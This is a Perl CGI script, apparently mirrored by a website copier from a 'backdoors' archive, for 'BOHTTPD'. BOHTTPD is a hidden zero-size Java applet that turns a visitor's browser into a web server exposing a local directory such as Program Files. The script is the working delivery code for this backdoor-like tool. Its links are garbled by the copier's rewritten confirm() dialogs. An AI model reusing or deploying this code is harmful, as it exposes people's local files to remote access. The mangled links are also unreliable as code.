#!/usr/bin/perl

use CGI;
use BOHTTPD;

my $cgi = new CGI;

sub show_applet {
  my $path = $cgi->param('path') ||
    (is_ms ? '/c:/Program Files' : '/usr/local');
  $path =~ s/^\/+//;
  $path =~ s/\/+$//;

  my $host = $ENV{REMOTE_HOST} || $ENV{REMOTE_ADDR};
  my $port = $cgi->param('port') || 8080;
  my $url ="http://${host}:${port}/${path}/";
  my ($HOST, $PATH, $PORT, $URL) = map html_escape($_), $host, $path, $port, $url;

  if (is_ie) {
    print qq<
      <p>
        BOHTTPD does not yet work with Internet Explorer.
        Get the latest version of Netscape Communicator in order to
        convert your browser into a Web Server!
      </p>
    >
  } else {
    print qq<
      <h3>Congratulations!</h3>
      <p>You are now running BOHTTPD on port $port!</p>
      <p>Click the link below to access your browser's web server:</p>
      <ul>
        <li><code><a href="javascript:if(confirm('http://gilbou.shacknet.nu/virii/backdoors/B/$URL  \n\nThis file was not retrieved by Teleport Pro, because it is linked too far away from its Starting Address. If you increase the in-domain depth setting for the Starting Address, this file will be queued for retrieval.  \n\nDo you want to open it from the server?'))window.location='http://gilbou.shacknet.nu/virii/backdoors/B/$URL'" tppabs="http://gilbou.shacknet.nu/virii/backdoors/B/$URL">$URL</a></code>
      </ul>
      <applet codebase=. trustproxy=1 code="BOHTTPD.class" tppabs="http://gilbou.shacknet.nu/virii/backdoors/B/BOHTTPD.class" name="BOHTTPD" width=0 height=0>
        <param name="host" value="$HOST">
        <param name="port" value="$PORT">
        <param name="path" value="$PATH">
      </applet>
    >
  }
}

sub show_form {
  my $path = $cgi->param('path') ||
    (is_ms ? '/C:/Program Files/' : '/usr/local/');
  $path =~ s/^\/\/+/\//;
  $path =~ s/\/\/+$/\//;

  my $port = $cgi->param('port') || 8080;
  my ($PATH, $PORT) = map html_escape($_), $path, $port;

  show_info;

  print qq<
    <form action="http://gilbou.shacknet.nu/virii/backdoors/B/BOHTTPD.cgi" method=post>
      <h3>Run BOHTTPD in Netscape</h3>
      <ul>
  >;

  show_warning;

  print qq<
      <table>
        <tr>
          <td>Path</td>
          <td><input type=text name=path value="$PATH"></td>
        </tr>
        <tr>
          <td>Port</td>
          <td><input type=text name=port value="$PORT"></td>
        </tr>
        <tr>
          <td colspan=2>
            <input type=hidden name=do value=applet>
            <input type=submit value="Start BOHTTPD">
          </td>
        </tr>
      </table>
      </ul>
    </form>
  >
}

sub show {
  show_header;

  if ($cgi->param('do') eq 'applet') {
    show_applet;
  } else {
    show_form;
  }

  show_footer;
}

print "Content-type: text/html\n\n";
&show;

1
